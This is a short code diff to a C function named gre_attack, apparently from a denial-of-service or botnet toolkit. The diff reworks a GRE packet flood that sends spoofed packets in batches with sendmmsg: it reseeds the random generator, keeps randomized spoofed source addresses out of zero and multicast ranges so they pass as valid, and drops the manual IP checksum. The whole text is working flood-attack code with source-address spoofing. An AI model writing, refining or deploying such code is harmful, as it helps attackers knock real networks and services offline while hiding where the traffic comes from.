@@ -11,7 +11,6 @@
 
 #include "gre_attack.h"
 #include "../headers/protocol.h"
-#include "../headers/checksum.h"
 
 struct gre_header {
     uint16_t flags;
@@ -50,8 +49,7 @@ void* gre_attack(void* arg) {
 
     size_t pkt_size = sizeof(struct iphdr) + sizeof(struct gre_header) + GRE_PAYLOAD;
 
-    /* Seed xorshift PRNG */
-    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32);
+    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32) ^ (uintptr_t)&params;
     if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;
 
     /* Pre-allocate batch of packets */
@@ -117,10 +115,12 @@ void* gre_attack(void* arg) {
 
             uint64_t r = xorshift64(&rng_state);
 
-            ip->saddr = (uint32_t)r;
+            uint32_t sip = (uint32_t)r;
+            uint8_t first = (sip >> 24) & 0xFF;
+            if (first == 0 || first >= 224) sip = (((first % 223) + 1) << 24) | (sip & 0x00FFFFFF);
+            ip->saddr = sip;
             ip->id    = htons((uint16_t)(r >> 32));
             ip->check = 0;
-            ip->check = generic_checksum(ip, sizeof(struct iphdr));
         }
 
         sendmmsg(fd, msgs, BATCH, MSG_NOSIGNAL);
